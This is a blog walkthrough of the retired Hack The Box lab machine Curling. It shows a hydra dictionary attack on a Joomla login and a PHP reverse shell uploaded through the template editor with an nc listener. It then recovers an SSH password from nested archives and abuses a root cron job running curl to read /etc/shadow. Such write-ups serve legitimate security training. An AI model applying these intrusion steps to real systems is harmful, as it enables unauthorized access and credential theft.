---
published: true
layout: post
author: Jake
date: '2019-03-31 00:00:01 UTC'
tags: htb walkthrough Curling
---

This week we are taking a look at the retired Hack The Box machine [Curling](https://www.hackthebox.eu/home/machines/profile/160) (Easy difficulty)

As usual we perform our initial enumeration with an nmap scan:
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
We see in the results that there is both port 22 and port 80 open.
```

Opening port 80 up in our browser we can see a website:
![210665510.png]({{site.baseurl}}/Images/Curling/210665510.png)

Based purely off the favicon we can tell that this is a Joomla site. We can confirm this theory easily by navigating to http://10.10.10.150/administrator :
![210599969.png]({{site.baseurl}}/Images/Curling/210599969.png)

We try some common default credential combinations like `admin:admin`, `admin:password` etc but none work.

Similar to Drupal and Wordpress there are CMS scanners for Joomla:

[JoomlaScan](https://github.com/drego85/JoomlaScan)

[JoomScan](https://github.com/rezasp/joomscan)

We download both of those into `/opt/scanners/` and let them run in the background:
```
root@kali: perl joomscan.pl -u 10.10.10.150
...

root@kali: python joomlascan.py -u http://10.10.10.150
...
```

While we are at it we can have some further enumeration going with gobuster
```
root@kali: gobuster -u http://10.10.10.150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 150 -x php,txt
```

The above command will try to navigate to all of the folders listed in the file, adding the `-x php,txt` argument will also tell the application to re-run the list with the .txt and .php file extensions.

Going back to look at this site we can see the main heading is interestingly titled "Cewl Curling Site!".

Now we know that there is a wordlist generator tool called cewl that scrapes websites and builds wordlists to use against login forms so lets run that next.
```
root@kali: cewl http://10.10.10.150 -m 5 -w curling-wordlist
```

Now we need to intercept a login request and perform a dictionary attack using the newly generated wordlist.
```
root@kali: hydra 10.10.10.150 http-post-form "/administrator:username=^USER^&passwd=^PASS^:Log in" -L users.list -P curling-wordlist
```

While this runs, lets look back at our gobuster to see if anything interesting has been discovered:
![210829363.png]({{site.baseurl}}/Images/Curling/210829363.png)

We notice a `secret.txt` file which looks like it could contain something interesting. pull that down with wget:
```
root@kali: wget http://10.10.10.150/secret.txt
```

Looking at the file we see what looks like a good potential password:
![210731073.png]({{site.baseurl}}/Images/Curling/210731073.png)

Browsing back to the site we try this password against our users `admin,administrator,floris`

But it does not work. Because this is a CTF and also a secret file it is possible that what we are looking at is actually an encoded value. Lets test that out by attempting to base64 decode the file.
```
root@kali: cat secret.txt | base64 -d
Curling2018!
```

That looks much more like a password. We try it again against the users and finally we get a successful login with `floris:Curling2018!`

Once logged in, in Joomla! we can modify the PHP directly by navigating to `Extensions>Templates>Templates`

Looking at the Styles page we can see that the default theme is the protostar theme:
![210534450.png]({{site.baseurl}}/Images/Curling/210534450.png)

Back on the Tempates page we click on Protostar Details and Files and we can see the php files that make up the template.

Clicking one of the files allows us to modify the php directly in the browser:
![210534455.png]({{site.baseurl}}/Images/Curling/210534455.png)

We can also upload our own php files so looking at pentest monkey to find a reliable php reverse shell

On the site we click `New File` and create a new file called shell.php in the contents of the file we can copy/paste the contents of the reliable shell:
![210501737.png]({{site.baseurl}}/Images/Curling/210501737.png)

Set up a listener with nc:
```
root@kali: nc -nlvp 1234
```

Navigate to the file http://10.10.10.150/templates/protostar/shell.php

and we get a reverse shell. We make the shell more interactive with python:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

As we are www-data we need to poke around to see if we can become a user or the root user, start with the `/etc/passwd` file to see what users exist:
![210534470.png]({{site.baseurl}}/Images/Curling/210534470.png)

We can see the users floris and root

poking around home directories:

![210534475.png]({{site.baseurl}}/Images/Curling/210534475.png)

Based on the file permissions we can see that we are able to read an interesting looking file called `password_backup`

Looking at the contents of the file we get what looks like a hexdump:
```
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48   
```

File password_backup says that the file is ASCII Text so we need to rely on the file header to determine what it is. Googling the text BZh91AY&SY shows that it is a bz2 file (magic bytes).

So now we need to convert the hexdump back into a binary file and for that we use a tool called `xxd`

I copied the file back to my local machine, because I know it has all the tools required on it. To do that I converted the file to base64, copied the output and base64 decoded it:

on the target:
```
base64 password_backup
```

Copy the output, and paste it into a file password_backup.b64. I then ran `base64 -d password_backup.b64 > password_backup.hex`

We now have an exact copy of the original file on our local machine.

To convert it back into its binary form we can now run:
```
root@kali: xxd -r password_backup.hex password_backup.bz2
```

Now it is time to try and extract the bz2 archive:
```
root@kali: bzip2 -dk password_backup.bz2
```

The flag `-d` is to decompress and the `-k` flag is to keep the original .bz2 file.

Now if we do file password_backup we get the output
```
password_backup: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
```

This indicates that the .bz2 file was holding a file called password.gz

lets `mv password_backup password.gz` and try to extract it
```
root@kali: gunzip --keep password.gz
```

We get another .bz file:
```
root@kali: file password
password: bzip2 compressed data, block size = 900k
```

Lets extract this one and see what we get:
```
root@kali: bzip2 -dk password
bzip2: Can't guess original name for password -- using password.out
```

and if we look at the contents of password.out we can see we finally have something readable:
```
root@kali: cat password.out
password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d<wdCbdZu)|hChXll
```

Running a hexdump on the file we can see with a little more clarity:
![210829407.png]({{site.baseurl}}/Images/Curling/210829407.png)

Looks like a username and password to me.

Time to move over to the SSH port.

We try logging in as root like the file suggests:
```
root@kali: ssh root@10.10.10.150
root@10.10.10.150's password: 5d<wdCbdZu)|hChXll
Access Denied
```

Remember there was also the user floris so lets try the password against that account:
```
root@kali: ssh floris@10.10.10.150
floris@10.10.10.150's password: 5d<wdCbdZu)|hChXll
Welcome ...
```

And we are in and can now read the user.txt



Now that we are on the box as a user it's time to try and priv esc.

Looking at our current directory we can see a folder `admin-area` that we now have access to read.

Taking a look at the directory we can see 2 files, both with the exact same modified time, and a time that is very recent compared to the current time, this indicates that there must be a repeating job running at a currently unknown interval that has something to do with these files.

taking a look at both the files we can see `input` looks like it holds a URL, and `report` looks like the result of hitting that url. Could this be `curl` or `wget` or even something else?

The name of the box is Curling so it would be safe to assume curl but lets confirm it anyway. On our attacking machine we host a SimpleHTTPServer:
```
root@kali: python -m SimpleHTTPServer 80
```

Time to update the URL. looking at man curl we can see what arguments it takes as a way of identifying that this is in fact the command. [GTFOBins](https://gtfobins.github.io/gtfobins/curl/) to the rescue.


Lets update input and watch out server till we get a hit.
![210665578.png]({{site.baseurl}}/Images/Curling/210665578.png)

Once we see a hit on our local http server we look at the contents of report and can see our suspicions are confirmed.
![210567244.png]({{site.baseurl}}/Images/Curling/210567244.png)

From here we can look further into the manual of curl and find that we can curl local files:
![210567249.png]({{site.baseurl}}/Images/Curling/210567249.png)

We still don't know who runs the cron, So lets have a look at that. running crontab -u floris -l will list if the crontab is running as the floris user. we get no results and our copy of the passwd file did not mention any other users, so we can safely assume it must be running as root, or a service account. We take a stab at the dark and try to read something only root can... like `/etc/shadow`
![210665589.png]({{site.baseurl}}/Images/Curling/210665589.png)

We wait for report to change and viola! we have the shadow file.
![210567257.png]({{site.baseurl}}/Images/Curling/210567257.png)

Having demonstrated that we can use the same technique to read the `/root/root.txt`
